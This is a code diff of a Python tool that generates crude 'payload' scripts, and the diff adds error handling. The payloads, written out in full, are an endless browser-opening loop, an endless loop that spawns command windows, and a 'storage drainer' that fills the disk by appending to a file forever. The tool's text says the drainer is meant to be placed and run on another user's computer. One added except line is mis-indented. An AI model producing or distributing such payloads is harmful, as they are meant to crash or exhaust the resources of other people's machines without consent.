@@ -18,41 +18,56 @@ Enter your choice: """)
        storagedrainer()
     elif choice == "4":
        help()
+    else:
+        print("Enter a valid choice")
+        main()
 def webcrasher():
-    your_file = input("Enter the file you want to save the payload too it can also make a file so you can just type the directory of where you want the payload to be make it a py file text files are fine but you will have to change it to python aftewards to be able to run the payload ")
-    f = open(your_file,"a")
-    f.write("""import webbrowser
+    try:    
+       your_file = input("Enter the file you want to save the payload too it can also make a file so you can just type the directory of where you want the payload to be make it a py file text files are fine but you will have to change it to python aftewards to be able to run the payload ")
+       f = open(your_file,"a")
+       f.write("""import webbrowser
 while True:
    url = "https://www.google.com/"
    webbrowser.open(url)""")                   
-    f.close()
-    print("Payload sent to",your_file)
-    print("Thanks for using this program")
-    main()
+       f.close()
+       print("Payload sent to",your_file)
+       print("Thanks for using this program")
+       main()
+    except IOError:
+        print("Enter a valid file")
+        webcrasher()
 
 
 def cmd():
-    print("Hello and welcome to cmd crasher guessing you want a cmd crashing payload you came to the right place")
-    cmd_file = input("Enter the file you want the payload sending too make sure too use py extension: ")
-    f = open(cmd_file, "a")
-    f.write("""import subprocess
+    try:
+       print("Hello and welcome to cmd crasher guessing you want a cmd crashing payload you came to the right place")
+       cmd_file = input("Enter the file you want the payload sending too make sure too use py extension: ")
+       f = open(cmd_file, "a")
+       f.write("""import subprocess
 while True:
    subprocess.call('start',shell=True)""")
-    f.close()
-    print("Payload sent to",cmd_file)
-    main()
-
+       f.close()
+       print("Payload sent to",cmd_file)
+       main()
+    except IOError:
+        print("Enter a valid choice")
+        cmd()
+        
 def storagedrainer():
-    print("Welcome to storage drainer this will make a file which you can put on the user's computer and then run and it will create a unknown file and start printing loads into it")
-    what_file = input("Where do you want to save this file: ")
-    f = open(what_file,"a")
-    f.write("""
+    try:
+        print("Welcome to storage drainer this will make a file which you can put on the user's computer and then run and it will create a unknown file and start printing loads into it")
+        what_file = input("Where do you want to save this file: ")
+        f = open(what_file,"a")
+        f.write("""
 while True:
    f = open("j.txt","a")
    f.write("#################################################################################@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@############################################################################################################################################################################################################################################################################################################")
    f.close()""")
-    print("Payload made saved to",what_file)
-    main()
+        print("Payload made saved to",what_file)
+        main()
+     except IOError:
+        print("Enter a valid choice")
+        storagedrainer()
 
 def help():
     print("""These payloads were made in python there not that hard to make but rookies may need help making them hence why I made this
